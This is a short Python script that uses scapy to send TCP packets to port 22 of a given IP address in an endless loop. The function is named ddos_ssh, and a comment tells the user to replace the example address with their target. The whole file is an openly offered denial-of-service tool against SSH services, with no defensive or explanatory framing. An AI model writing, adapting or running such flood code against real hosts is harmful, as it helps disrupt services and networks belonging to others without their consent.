from scapy.all import *

def ddos_ssh(target_ip, port):
    while True:
        # Create an IP packet
        ip = IP(dst=target_ip)
        # Create a TCP packet with SSH port destination
        tcp = TCP(dport=port)
        # Combine and send the packet1
        send(ip/tcp, verbose=False)

ddos_ssh("192.168.1.100", 22)  # Replace with your target IP and port.